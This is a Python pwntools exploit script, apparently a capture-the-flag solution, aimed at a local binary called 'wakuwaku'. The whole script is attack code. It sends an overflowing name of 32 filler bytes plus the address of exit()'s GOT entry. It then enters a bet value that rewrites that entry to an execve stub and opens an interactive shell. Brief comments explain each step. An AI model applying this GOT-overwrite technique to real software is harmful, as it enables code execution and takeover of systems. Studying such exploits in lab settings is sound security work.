from pwn import *


# Handle inject code
got_exit_addr = p64(0x0000000000406050)  # Global Offset Table of exit()

payload = b""
payload += b"\x01" * 32
payload += got_exit_addr

plt_execve_addr = b"4199280"  # Cover exit@plt() into 0x401370 in GOT, note that GOT of exit() not dynamically linked yet


# Start process
p = process("./wakuwaku")


# Stop there and attached with gdb
# raw_input()  # In python standard library, used for wating input


# Start to inject
p.recvuntil(b"What's your name ?\nName: ")
p.sendline(payload)

p.recvuntil(b"Place your bets (minimum is $10000) : ")
p.sendline(plt_execve_addr)

p.recvuntil(b"Guess your number (ans betwwen 0~999) : ")
p.sendline(b"")  # Don't input any value

p.interactive()


